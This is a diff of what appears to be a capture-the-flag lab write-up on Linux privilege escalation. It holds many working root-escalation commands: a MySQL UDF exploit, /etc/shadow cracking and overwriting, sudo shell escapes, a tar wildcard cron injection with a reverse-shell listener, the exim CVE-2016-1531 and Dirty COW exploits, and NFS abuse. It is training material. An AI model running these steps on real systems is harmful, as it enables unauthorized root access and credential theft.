@@ -223,41 +223,48 @@ cd /home/user/tools/mysql-udf
 
 Following the instructions provided on the exploit [link](https://www.exploit-db.com/exploits/1518) provided above, we need to compile the file before use:
 
-`gcc -g -c raptor_udf2.c`
-<br />
-`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`
+```
+gcc -g -c raptor_udf2.c
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
 
 Once compiled, we can proceed to run `mysql` as `root` using a blank password:
 
-`mysql -u root -p`
+```
+mysql -u root -p
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172220178-7765795d-509d-4c8b-8780-1041318062a9.png)
 
 We can now proceed with the following commands on the `mysql` shell to create a User Defined Function (UDF) `do_system` using the exploit we compiled:
 
-`use mysql;`
-<br />
-`create table foo(line blob);`
-<br />
-`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`
-<br />
-`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`
-<br />
-`create function do_system returns integer soname 'raptor_udf2.so';`
+```
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+```
 
 The table entries can be confirmed with the following command:
 
-`select * from mysql.func;`
+```
+select * from mysql.func;
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172221440-d3b92d41-c2bb-46a8-9584-9a51764dcfbb.png)
 
 Now, we copy `/bin/bash` to `/tmp/rootbash` and set the SUID permission:
 
-`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
+```
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+```
 
 Exit the `mysql` shell by typing `exit` or `\q`. Running the `/tmp/rootbash` shell will grant root privileges on the machine.
 
-`/tmp/rootbash -p`
+```
+/tmp/rootbash -p
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172222490-17d98725-2456-4d71-9005-2c9aa3b83e45.png)
 
@@ -280,6 +287,7 @@ No answer needed
 <br />
 
 Checking the contents of the `shadow` file we can apparently see the hash for `root` and `user`.
+
 ```
 cat /etc/shadow
 ```
@@ -302,6 +310,7 @@ Before we proceed with the next steps, we should ideally save the hash in a file
 <br />
 
 There are multiple ways we can use to analyze the hash. We can either do it locally using `hashid`:
+
 ```
 hashid hash.txt
 ```
@@ -323,6 +332,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt FILENAME
 ![image](https://user-images.githubusercontent.com/14150485/172003660-85deec4a-bccf-4726-becd-362ca8af9391.png)
 
 Regardless of the approach to this solution, it looks like we are dealing with a type `sha512crypt` hash.
+
 ```
 sha512crypt
 ```
@@ -334,11 +344,13 @@ sha512crypt
 <br />
 
 Cracking the hash using John The Ripper reveals the password:
+
 ```
 password123
 ```
 
 We can now switch to `root` using the `su` command and password we just cracked:
+
 ```
 su root
 ```
@@ -353,6 +365,7 @@ su root
 <br />
 
 This task is detailing the ease of editing writable `shadow` files to take advantage of passwords we can generate on our own using the `mkpasswd` command:
+
 ```
 mkpasswd -m sha-512 PASSWORD_HERE
 ```
@@ -360,6 +373,7 @@ mkpasswd -m sha-512 PASSWORD_HERE
 ![image](https://user-images.githubusercontent.com/14150485/172007026-bc474a3f-7da7-46bd-a94e-6266076606f5.png)
 
 We can now edit the `shadow` file and paste the generated hash between the first and second colons.
+
 ```
 nano /etc/shadow
 ```
@@ -367,6 +381,7 @@ nano /etc/shadow
 ![image](https://user-images.githubusercontent.com/14150485/172007071-fc8ee104-118f-47c4-8d3c-326a8db4bdba.png)
 
 To test the new password we simply save the file and `exit` from root back to user level.
+
 ```
 su root
 ```
@@ -462,9 +477,10 @@ Remember to exit back after each root escalation before attempting another explo
 
 *If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
 
-`sudo iftop`
-<br />
-`/bin/sh`
+```
+sudo iftop
+/bin/sh
+```
 
 The `sudo iftop` command launches the application. The `!` character will then enable user input that we can use to execute the `/bin/sh/` command within it:
 
@@ -483,7 +499,9 @@ This will grant root access to the machine!
 
 *If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
 
-`sudo find . -exec /bin/sh \; -quit`
+```
+sudo find . -exec /bin/sh \; -quit
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172013238-7a66d7ba-f032-49f9-a4ad-11a31378b90d.png)
 
@@ -502,6 +520,7 @@ This will grant root access to the machine!
 <br />
 `reset; sh 1>&0 2>&0`
 
+
 ![image](https://user-images.githubusercontent.com/14150485/172014033-8ed77c1d-c3e8-40d8-9051-d6c116811d85.png)
 
 After executing the command, any user input is not displayed in nano which can make it a little hard for us to see what it really does, however the above steps do grant root access to the target. We can confirm this by cleaning the active window using the `clear` command and then checking the active user using `whoami`.
@@ -517,15 +536,15 @@ After executing the command, any user input is not displayed in nano which can m
 
 *If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
 
-*(a) ```sudo vim -c ':!/bin/sh'```*
+*(a) `sudo vim -c ':!/bin/sh'`*
 
 *(b) This requires that vim is compiled with Python support. Prepend :py3 for Python 3.*
 <br />
-*```sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'```*
+*`sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`*
 
 *(c) This requires that vim is compiled with Lua support.*
 <br />
-*```sudo vim -c ':lua os.execute("reset; exec sh")'```*
+*`sudo vim -c ':lua os.execute("reset; exec sh")'`*
 
 <br />
 
@@ -543,9 +562,10 @@ The line used in example (a) seems to run successfully:
 
 *If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
 
-`sudo man man`
-<br />
-`!/bin/sh`
+```
+sudo man man
+!/bin/sh
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172016119-72b9ebb8-61dc-4ef2-b38b-05e7ea6e35a9.png)
 
@@ -562,7 +582,9 @@ Once again, the exploit grants root access to the machine.
 
 *If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
 
-```sudo awk 'BEGIN {system("/bin/sh")}'```
+```
+sudo awk 'BEGIN {system("/bin/sh")}'
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172016444-46b9f785-5351-4a2f-9e14-76fbcceadba7.png)
 
@@ -575,9 +597,10 @@ Once again, the exploit grants root access to the machine.
 
 *If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
 
-```sudo less /etc/profile```
-<br />
-```!/bin/sh```
+```
+sudo less /etc/profile
+!/bin/sh
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172016574-7fdc2c82-e035-4cca-8e0c-ffde770343f9.png)
 
@@ -594,9 +617,10 @@ The `!` character enables code execution which allows us to run the `/bin/sh` co
 
 *If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
 
-```sudo ftp```
-<br />
-```!/bin/sh```
+```
+sudo ftp
+!/bin/sh
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172016751-ac465d2c-d464-4e31-bbd3-b29bdf3d3012.png)
 
@@ -610,19 +634,19 @@ The `!` character enables code execution which allows us to run the `/bin/sh` co
 *If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
 
 *(a) Input echo is disabled.*
-<br />
-`TF=$(mktemp)`
-<br />
-`echo 'os.execute("/bin/sh")' > $TF`
-<br />
-`sudo nmap --script=$TF`
-<br />
+
+```
+`TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+sudo nmap --script=$TF`
+```
 
 *(b) The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
-<br />
-`sudo nmap --interactive`
-<br />
-`nmap> !sh`
+
+```
+sudo nmap --interactive
+nmap> !sh
+```
 
 <br />
 
@@ -643,9 +667,10 @@ And example (b):
 
 *If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
 
-```TERM= sudo more /etc/profile```
-<br />
-```!/bin/sh```
+```
+TERM= sudo more /etc/profile
+!/bin/sh
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172017159-7e447b85-e637-499f-bd3c-f6e1e22668af.png)
 
@@ -875,9 +900,11 @@ After cron picks up the task within a minute, running the `rootbash` file with S
 
 Remember to remove the modified code, remove the `/tmp/rootbash` executable and `exit` out of the elevated shell before continuing as you will create this file again later in the room!
 
-`rm /home/user/overwrite.sh`
-`rm /tmp/rootbash`
-`exit`
+```
+rm /home/user/overwrite.sh
+rm /tmp/rootbash
+exit
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172369341-1c156902-9890-41fd-9c1b-b2b5bf813028.png)
 
@@ -946,15 +973,18 @@ chmod +x shell.elf
 
 Create the following files in the `/home/user` directory as instructed on the task:
 
-`touch /home/user/--checkpoint=1`
-<br/>
-`touch /home/user/--checkpoint-action=exec=shell.elf`
+```
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+```
 
 The files we just created are valid `tar` informative output options, which we can also confirm using the `tar --help` command. Once the `tar` cron job runs, the wildcard `*` will include these files and since both filenames are valid `tar` options they will be recognized and treated as such, rather than filenames.
 
 Next up we need to set up a `netcat` listener locally. Please note that the port number should be the same we used to create the `shell.elf` reverse shell.
 
-`nc -lvnp LOCAL_PORT`
+```
+nc -lvnp LOCAL_PORT
+```
 
 After a short wait the cron job runs and the listener picks up the connection to the target:
 
@@ -985,19 +1015,25 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 
 Per the instructions on the task, we should look for known exploits related to `/usr/sbin/exim-4.84-3`. Searching for `exim 4.84-3` brings up `CVE-2016-1531` on [Exploit-DB](https://www.exploit-db.com/exploits/39535). We can proceed to download the exploit, however before doing so I found it already located under the `/home/user/tools/exim/` directory of the target system:
 
-`locate cve-2016-1531`
+```
+locate cve-2016-1531
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172491693-9d0ed091-9184-422c-9dd1-8d4ba546d5bc.png)
 
 Although the specified location was not available, I was able to `find` a copy of it under the `/home/user/tools/suid/exim/` folder:
 
-`find /home -name 'cve*'`
+```
+find /home -name 'cve*'
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172494315-8d4ff762-dced-47d5-8455-35b001c0b547.png)
 
 Running the exploit will spawn a root shell.
 
-`/home/user/tools/suid/exim/cve-2016-1531.sh`
+```
+/home/user/tools/suid/exim/cve-2016-1531.sh
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172493140-bdd047d2-32a8-4560-ba25-bd5b48954928.png)
 
@@ -1026,7 +1062,9 @@ In this task, the `/usr/local/bin/suid-so` SUID executable is vulnerable to shar
 
 The `strace` command will help us stack trace all the libraries and files accessed by the executable. Let's run the command with the options provided on the task:
 
-`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
+```
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172703331-10421e49-816f-42e6-b0fc-2d70b7e8b4ce.png)
 
@@ -1153,8 +1191,10 @@ In bash versions <4.2-048 it is possible to define shell functions with names re
 
 The current version is 4.1.52(1)-release, meaning we can indeed define functions with file names. Let's follow the intructions on the task to create one with the name `/usr/sbin/service` that will execute a new bash shell, using option `-p`to ensure permissions are preserved, and then export the function:
 
-`function /usr/sbin/service { /bin/bash -p; }`
-`export -f /usr/sbin/service`
+```
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+```
 
 Once done we can proceed to run the  `/usr/local/bin/suid-env2` executable to get our root shell:
 
@@ -1255,6 +1295,7 @@ What we find is an `auth-user-pass` reference pointing at the `/etc/openvpn/auth
 ```
 cat /etc/openvpn/auth.txt
 ```
+
 ![image](https://user-images.githubusercontent.com/14150485/172807585-04a1dd7e-7da4-49ea-a9e5-9952f50cd1e1.png)
 
 This should suffice for us to escalate to root:
@@ -1342,8 +1383,10 @@ su root
 
 Now as root on our local machine we will be creating a mount point that we can use to mount the `/tmp` share - Please note that `vers=3` worked for me when mounting the share:
 
-`mkdir /tmp/nfs`
-`mount -o rw,vers=2 REMOTE_IP:/tmp /tmp/nfs`
+```
+mkdir /tmp/nfs
+mount -o rw,vers=2 REMOTE_IP:/tmp /tmp/nfs
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172828679-2f6b9150-920c-484f-8cb8-e67566f5421e.png)
 
@@ -1392,8 +1435,9 @@ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-su
 
 The `Dirty COW` exploit comes up on the list. An exploit for this can be found under `/home/user/tools/kernel-exploits/dirtycow/c0w.c`. The xploit essentially replaces the SUID file `/usr/bin/passwd` with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak). Let's proceed to compile the code and run it.
 
-`gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w`
-`./c0w`
+```gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w
+```
 
 ![image](https://user-images.githubusercontent.com/14150485/172830885-11c951bc-b68e-4300-a9d2-392227275ce6.png)
 
@@ -1409,9 +1453,10 @@ Once the exploit finishes running, executing `/usr/bin/passwd` will spawn a root
 
 Remember to restore the original `/usr/bin/passwd` file and exit the root shell before continuing!
 
-`mv /tmp/bak /usr/bin/passwd`
-<br/>
-`exit`
+```
+mv /tmp/bak /usr/bin/passwd
+exit
+```
 
 <br/>
 
